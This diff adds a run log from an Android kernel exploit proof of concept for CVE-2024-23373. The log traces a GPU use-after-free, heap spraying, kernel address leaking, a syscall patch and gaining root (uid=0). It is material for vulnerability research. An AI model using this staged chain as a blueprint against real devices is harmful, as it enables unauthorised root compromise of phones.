@@ -1,0 +1,128 @@
+ALIVE-MAIN
+[5653] [CFG] TRIGGER=1 PRIV_WRITE=1 PER_BATCH=256 BATCH_DELAY_MS=2 RETIRE_ON=1 argc=5
+[5653] [ENV] PKEY_HIJACK_ONLY=1 UMHONLY=(unset) LEGACY_BLIND_WRITE=0 BLIND_WRITE_AFTER_ROOT=(unset) REL_FORCE=(unset) POC_LOG_FILE=(unset)
+[5653] [ORIGIN] pid=5653 ppid=5652 pgid=5653 sid=5653
+[5653] === ZF8 CVE-2024-23373 PoC (SlideTest -> PhysRW -> Root staged chain) ===
+[5653] [*] pre-sync skipped: an f2fs sync() has hung this device
+[5653] === step 1 (ALLOC-UAF): GPUOBJ_ALLOC(UAF_SIZE, USE_CPU_MAP) -> entry A ===
+[5653] [+] A: id=1 gpuaddr=0x7001ff000 (HOSTPTR=0x7001ff000)
+[5653] === step 2: PLACE anchor (ALLOC + fixed mmap @ PLACE_ADDR) ===
+[5653] === step 3: BOGUS anchor (1 anon page @ BOGUS_ADDR; find_vma precondition) ===
+[5653] === step 4: wrap import race (bogus_thread) + OVERLAP mmap ===
+[5653] [*] waiting for the warn_alloc ratelimit to reset (10s)...
+[5653] [D] bogus import first error errno=12 dt=10139us
+[5653] [D] bogus_thread done: 3 errors total (first errno=12 dt=10139us)
+[5653] [D] race attempt 1 done: ok=0 enodev=1 ebusy=0 eother=3
+[5653] === step 5: GPUOBJ_FREE(A) -> unmap hits the first-page hole -> -ENODEV ignored -> full release ===
+[5653] [+] FREE(A): ret=0 errno=0
+[5653] === step 6: discriminator; re-import the same hostptr (0x1000) ===
+[5653] [+] discriminator: re-import failed errno=12 (Cannot allocate memory); the SVM region was kept = unmap failure confirmed -> UAF established!
+[5653] [+] dangling: [0x700200000, 0x710203000) (65539 pages); SMMU PTEs left behind
+[5653] [UMH] forge prealloc 4 pages
+[5653] [+] CHURN: id=6 gpuaddr=0x4000000000 (8 MB) -- post-trigger
+[5653] [D] after dangling: avail=4446MB MemFree=1532MB Cached=2557MB SwapFree=4095MB KReclaimable=810MB poolProxy=696MB
+[5653] === 0b. pre-UAF object setup (after trigger, before P1; reverted because that layout change made P2 stall 3/3) ===
+[5653] [+] IB: ctx=4 id=8 gpuaddr=0x3ffff7c000
+[5653] [+] IB: ctx=5 id=10 gpuaddr=0x3fffefc000
+[5653] [+] spare IB: ctx=5 ib=0x3fffefc000
+[5653] [+] IB: ctx=10 id=12 gpuaddr=0x3fffe7c000
+[5653] [+] heartbeat started (prevents collapse): ctx=10 ib=0x3fffe7c000
+[5653] [+] DST: id=13 user=0x7c274d9000 gpuaddr=0x4000890000
+[5653] === control group: GPU 0x3D writes DST+0x1000 = 0xCAFE3311 -> read back ===
+[5653] [D] control group: wrote 0xCAFE3311, read back 0xcafe3311 PASS
+[5653] [+] pre-UAF control group PASS
+[5653] === 2.5 pre-burn: SKIP (preburn consumes freed pages) ===
+[5653] [D] after pre-burn(SKIP): avail=4444MB MemFree=1531MB Cached=2557MB SwapFree=4095MB KReclaimable=808MB poolProxy=694MB
+[5653] === 2.6 pool drain pressure (anon until avail<1000MB, hold 2s) ===
+[5653] [D] pressure 1: 256MB, avail=4185MB
+[5653] [D] pressure 2: 512MB, avail=3929MB
+[5653] [D] pressure 3: 768MB, avail=3672MB
+[5653] [D] pressure 4: 1024MB, avail=3416MB
+[5653] [D] pressure 5: 1280MB, avail=3160MB
+[5653] [D] pressure 6: 1536MB, avail=2910MB
+[5653] [D] pressure 7: 1792MB, avail=2657MB
+[5653] [D] pressure 8: 2048MB, avail=2402MB
+[5653] [D] pressure 9: 2304MB, avail=2148MB
+[5653] [D] pressure 10: 2560MB, avail=1900MB
+[5653] [D] pressure 11: 2816MB, avail=1657MB
+[5653] [D] pressure 12: 3072MB, avail=1421MB
+[5653] [D] pressure 13: 3328MB, avail=1186MB
+[5653] [D] pressure 14: 3584MB, avail=939MB
+[5653] [*] holding pressure for 2s (measured shrinker pool drain is <2s; 5s -> 2s)...
+[5653] [D] after pressure: avail=1121MB MemFree=333MB Cached=1098MB SwapFree=3992MB KReclaimable=151MB poolProxy=84MB
+[5653] [D] after pressure release: avail=4709MB MemFree=3921MB Cached=1098MB SwapFree=3992MB KReclaimable=151MB poolProxy=84MB
+[5653] === 2. P1: SKIP (removed; time after the UAF is the critical resource) ===
+[5653] [D] after P1 (quick pressure): avail=4711MB MemFree=3923MB Cached=1098MB SwapFree=3992MB KReclaimable=151MB poolProxy=84MB
+[5653] [D] health check: MemFree=3923MB avail=4711MB proxy=84MB
+[5653] [!] proxy=84MB<150; warning only (pool already drained)
+[5653] [+] probe avg 6 us; OK
+[5653] === 2.8 L3 warm-up (200 dummy) ===
+[5653] [+] L3 warm-up complete
+[5653] [D] upr recon: unix.max_dgram_qlen=600
+[5653] [D] upr/h1 pipes: 64 pipes x 1MB = 64MB held as UNMOVABLE
+[5653] [D] upr/h2 sockets: 2591 pairs, backlog 850MB
+[5653] [D] upr/h3 dgram short burst: 84MB momentary
+[5653] [D] pressure released: 2591 socket pairs, 64 pipes
+[5653] [D] after pressure release: avail=4711MB MemFree=3921MB Cached=1098MB SwapFree=3992MB KReclaimable=153MB poolProxy=84MB
+[5653] === 3. P2: direct adaptive spray (no preburn/burn; freed pages stay at the LIFO head) ===
+[5653] [BURN] wave A: 96 children (comm=burnNN)
+[5653] [D] P2 4096 entries; ROSCAN read-only probe (full window 65539 pages x 8 slots)
+[5653] [ROSCAN] gpuaddr+id table 4096/4096 (no GPU enumeration needed)
+[5653] [ROSCAN] scanned 65538 pages -> 0 hits (zero window writes, 0 faults, last batch 256 pages)
+[5653] [ROSCAN] census: dgram=340680 pipe=0 kgsl=0 zero=182157
+[5653] [D] hits after ROSCAN probe 0
+[5653] [D] P2 8192 entries; ROSCAN read-only probe (full window 65539 pages x 8 slots)
+[5653] [ROSCAN] gpuaddr+id table 8192/8192 (no GPU enumeration needed)
+[5653] [ROSCAN] scanned 65538 pages -> 0 hits (zero window writes, 0 faults, last batch 256 pages)
+[5653] [ROSCAN] census: dgram=340584 pipe=0 kgsl=0 zero=182253
+[5653] [D] hits after ROSCAN probe 0
+[5653] [D] P2 12288 entries; ROSCAN read-only probe (full window 65539 pages x 8 slots)
+[5653] [ROSCAN] gpuaddr+id table 12288/12288 (no GPU enumeration needed)
+[5653] [ROSCAN] scanned 65538 pages -> 0 hits (zero window writes, 0 faults, last batch 256 pages)
+[5653] [ROSCAN] census: dgram=340392 pipe=0 kgsl=0 zero=182445
+[5653] [D] hits after ROSCAN probe 0
+[5653] [D] P2 16384 entries; ROSCAN read-only probe (full window 65539 pages x 8 slots)
+[5653] [*] waited out the window; entering the clean band
+[5653] [ROSCAN] gpuaddr+id table 16384/16384 (no GPU enumeration needed)
+[5653] [+] ROSCAN hit entry id=15530: page=47799 slot=0 (gpa=000000400453c000 id@0x98=15530)
+[5653] [+] ROSCAN hit entry id=15527: page=47799 slot=1 (gpa=0000004004539000 id@0x98=15527)
+[5653] [+] ROSCAN hit entry id=15529: page=47799 slot=2 (gpa=000000400453b000 id@0x98=15529)
+[5653] [ROSCAN] scanned 65538 pages -> 64 hits (zero window writes, 0 faults, last batch 256 pages)
+[5653] [ROSCAN] census: dgram=340008 pipe=0 kgsl=0 zero=182765
+[5653] [D] hits after ROSCAN probe 64
+[5653] [D] spray finished: 16384 entries, 64 hits
+[5653] [CHURN2] short-lived children swapped/dropped 400 credentials (more cred_jar slot churn inside the window)
+[5653] [+] P2 complete: 16384 entries (64 hits)
+[5653] [BURN] wave B: +64 children (total 160)
+[5653] [PIN] fork parent pinned to CPU0 (slab steal consistency)
+[5653] [PARK] skipping the 800 credential-in-window parked children (PKEY_HIJACK_ONLY fast path does not need SWEEP)
+[5653] [BURN] wave C: +96 children (total 256)
+[5653] [BURN] wave R: +64 children (total 320)
+[5653] === SLIDETEST (ROOT): 8 hits; dual-channel self-validation ===
+[5653] [+] IB: ctx=11 id=16399 gpuaddr=0x3fffdfc000
+[5653] [*] ST[7] id=15536 pg=47799 sz=00001000/00001000OK gpa=0000004004542000OK flg=00000000000c0000OK opsM=ffffffe436b5d3a8 opsC=ffffffe436b5d3a8 pt=ffffffb8741b8900 dev=ffffffb93730a010
+[5653] [*] ST[6] id=15515 pg=47799 sz=00001000/00001000OK gpa=000000400452d000OK flg=00000000000c0000OK opsM=ffffffe436b5d3a8 opsC=ffffffe436b5d3a8 pt=ffffffb8741b8900 dev=ffffffb93730a010
+[5653] [*] ST[5] id=15522 pg=47799 sz=00001000/00001000OK gpa=0000004004534000OK flg=00000000000c0000OK opsM=ffffffe436b5d3a8 opsC=ffffffe436b5d3a8 pt=ffffffb8741b8900 dev=ffffffb93730a010
+[5653] [*] ST[4] id=15543 pg=47799 sz=00001000/00001000OK gpa=0000004004549000OK flg=00000000000c0000OK opsM=ffffffe436b5d3a8 opsC=ffffffe436b5d3a8 pt=ffffffb8741b8900 dev=ffffffb93730a010
+[5653] [*] ST[3] id=15519 pg=47799 sz=00001000/00001000OK gpa=0000004004531000OK flg=00000000000c0000OK opsM=ffffffe436b5d3a8 opsC=ffffffe436b5d3a8 pt=ffffffb8741b8900 dev=ffffffb93730a010
+[5653] [*] ST[2] id=15529 pg=47799 sz=00001000/00001000OK gpa=000000400453b000OK flg=00000000000c0000OK opsM=ffffffe436b5d3a8 opsC=ffffffe436b5d3a8 pt=ffffffb8741b8900 dev=ffffffb93730a010
+[5653] [*] ST[1] id=15527 pg=47799 sz=00001000/00001000OK gpa=0000004004539000OK flg=00000000000c0000OK opsM=ffffffe436b5d3a8 opsC=ffffffe436b5d3a8 pt=ffffffb8741b8900 dev=ffffffb93730a010
+[5653] [*] ST[0] id=15530 pg=47799 sz=00001000/00001000OK gpa=000000400453c000OK flg=00000000000c0000OK opsM=ffffffe436b5d3a8 opsC=ffffffe436b5d3a8 pt=ffffffb8741b8900 dev=ffffffb93730a010
+[5653] [D] summary: full-validate 8/8 (sz 8 gpa 8 flg 8) candidates 8
+[5653] [+] POOL_OPS runtime=0xffffffe436b5d3a8 (8/8 agree) delta=0x2424a00000 (2MB-aligned)
+[5653] [+] runtime _text=ffffffe434a80000 contig=ffffffe436b5d308 modprobe_pa=92b08e48 selinux_pa=92cac001
+[5653] [+] IB: ctx=12 id=16401 gpuaddr=0x3fffd7c000
+[5653] [D] low bank size landed=c0000000
+[5653] [D] low bank mmap=0x7b66fd8000 errno=0
+[5653] [PKEY] audit_enabled 0->0 rb=0 ✓
+[5653] [PKEY-STUB] stub original 928004a0 d65f03c0 | override head d5384109 f9440528
+[5653] [PKEY] patch PA=a0313994 w0=b0013fa0 w2=14000a37 (landed ✓)
+[5653] [PKEY] tracing off attempt
+[5653] [PKEY-STUB] getpid=5653 ok ✓ (exit path clear)
+[PAUSE] RESTORE_STUB rb=928004a0
+[PAUSE] RESTORE_STUB done
+[PKEY-GO] stub restored: syscall 289 is inert again
+[uaf-pause-enter]
+[5653] [*] UAF live; pausing to preserve the device (no exit, avoids the kgsl teardown crash)
+[5653] [SRV] pid=6578 server alive (/proc present)
+[5653] [PKEY-HB] pkey_inflight=0 @0x7c28509000 wd_round=103 | 289 return=-304818681984 uid=0
